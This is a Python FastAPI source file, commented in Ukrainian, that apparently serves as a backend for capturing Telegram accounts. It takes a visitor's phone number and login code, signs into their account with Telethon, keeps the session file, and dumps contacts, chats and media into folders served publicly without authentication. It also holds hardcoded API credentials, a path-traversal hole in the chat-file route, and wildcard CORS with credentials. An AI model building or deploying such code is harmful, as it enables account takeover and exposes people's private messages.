import asyncio
import os
from contextlib import asynccontextmanager

import uvicorn
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, RedirectResponse
from telethon.tl.types import User, Chat, Channel
from utils import update_user_data

API_ID = 23331207
API_HASH = "2d64092b8ecaded2ebb5ad25de96e222"


async def periodic_update():
    while True:
        if not os.path.exists(USERS_FOLDER):
            await asyncio.sleep(3600)
            continue
        for user_folder in os.listdir(USERS_FOLDER):
            folder_path = os.path.join(USERS_FOLDER, user_folder)
            if not os.path.isdir(folder_path):
                continue

            print(f"Periodic update skipped for user {user_folder} — needs implementation")
        await asyncio.sleep(3600)

@asynccontextmanager
async def lifespan(app: FastAPI):
    task = asyncio.create_task(periodic_update())
    try:
        yield
    finally:
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass
# 🔁 Замінити на свій

# Папка з усіма юзерами
USERS_FOLDER = "./users"
SESSIONS_FOLDER = "./sessions"

os.makedirs(USERS_FOLDER, exist_ok=True)
os.makedirs(SESSIONS_FOLDER, exist_ok=True)
app = FastAPI(lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # дозволити всі джерела
    allow_credentials=True,
    allow_methods=["*"],  # дозволити всі HTTP-методи
    allow_headers=["*"],  # дозволити всі заголовки
)

session_name = "anon2"
phone_number = None  # глобальна змінна
# Словник для тимчасового зберігання сесій авторизації
sessions = {}



# Монтую папку з користувачами і медіа як статичні файли
app.mount("/users", StaticFiles(directory=USERS_FOLDER), name="users")

templates = Jinja2Templates(directory="templates")  # створити цю папку

class PhonePayload(BaseModel):
    phone: str

class CodePayload(BaseModel):
    code: str


@app.get("/")
async def home(request: Request):
    return templates.TemplateResponse("index.html", {'request': request})

@app.post("/send_phone")
async def send_phone(data: PhonePayload):
    phone_number = data.phone
    session_name = f"{SESSIONS_FOLDER}/session_{phone_number}"
    client = TelegramClient(session_name, API_ID, API_HASH)
    await client.connect()
    if not await client.is_user_authorized():
        result = await client.send_code_request(phone_number)
        sessions[phone_number] = {"phone_code_hash": result.phone_code_hash}
    await client.disconnect()
    return {"status": "code_sent"}

@app.post("/verify_code")
async def verify_code(data: CodePayload):
    # Знайдемо номер за кодом (в реалі потрібно покращити)
    phone_number = next((k for k,v in sessions.items() if "phone_code_hash" in v), None)
    if not phone_number:
        return {"error": "Send phone first."}
    phone_code_hash = sessions[phone_number]["phone_code_hash"]

    session_name = f"{SESSIONS_FOLDER}/session_{phone_number}"
    client = TelegramClient(session_name, API_ID, API_HASH)
    await client.connect()

    if not await client.is_user_authorized():
        try:
            await client.sign_in(phone_number, data.code, phone_code_hash=phone_code_hash)
        except SessionPasswordNeededError:
            return {"error": "2FA enabled. Not supported."}
        except Exception as e:
            return {"error": f"Code error: {str(e)}"}

    try:
        me = await client.get_me()
        username = me.username or f"{me.first_name}_{me.id}"
        # Назва папки з юзером і номером телефону
        folder_name = f"{username}_{phone_number.replace('+','')}"
        folder = os.path.join(USERS_FOLDER, folder_name)
        os.makedirs(folder, exist_ok=True)

        # Запуск оновлення з пріоритетом (контакти, чати, медіа...)
        await update_user_data(client, me, folder)

    finally:
        await client.disconnect()
        # Видаляємо сесію після успішного логіну
        sessions.pop(phone_number, None)

    return {"status": "ok", "folder": folder_name}

@app.get("/users", response_class=HTMLResponse)
async def list_users(request: Request):
    users = []
    if os.path.exists(USERS_FOLDER):
        for name in os.listdir(USERS_FOLDER):
            path = os.path.join(USERS_FOLDER, name)
            if os.path.isdir(path):
                users.append(name)
    return templates.TemplateResponse("users_list.html", {"request": request, "users": users})

@app.get("/user/{user_folder}/chats", response_class=HTMLResponse)
async def user_chats(request: Request, user_folder: str):
    folder_path = os.path.join(USERS_FOLDER, user_folder)
    index_path = os.path.join(folder_path, "index.html")
    if not os.path.exists(index_path):
        return HTMLResponse(f"<h1>Chats not found for user {user_folder}</h1>", status_code=404)

    with open(index_path, "r", encoding="utf-8") as f:
        content = f.read()
    return HTMLResponse(content)

@app.get("/user/{user_folder}/chats/{user_chat}", response_class=HTMLResponse)
async def user_chat(user_folder: str, user_chat: str, request: Request):
    folder_path = os.path.join(USERS_FOLDER, user_folder)
    chat_path = os.path.join(folder_path, f"chats/{user_chat}")
    with open(chat_path, "r", encoding="utf-8") as f:
        content = f.read()
    return HTMLResponse(content)


# --- Запуск оновлення для всіх юзерів кожну годину ---
async def periodic_update():
    while True:
        if not os.path.exists(USERS_FOLDER):
            await asyncio.sleep(3600)
            continue
        for user_folder in os.listdir(USERS_FOLDER):
            folder_path = os.path.join(USERS_FOLDER, user_folder)
            if not os.path.isdir(folder_path):
                continue

            # Відновити client із збереженої сесії — складно, можна перепарсити
            # Але тут просто пропускаємо (треба зберігати токени/сесії в БД для реального оновлення)
            print(f"Periodic update skipped for user {user_folder} — needs implementation")
        await asyncio.sleep(3600)


if __name__ == '__main__':
    uvicorn.run(app)
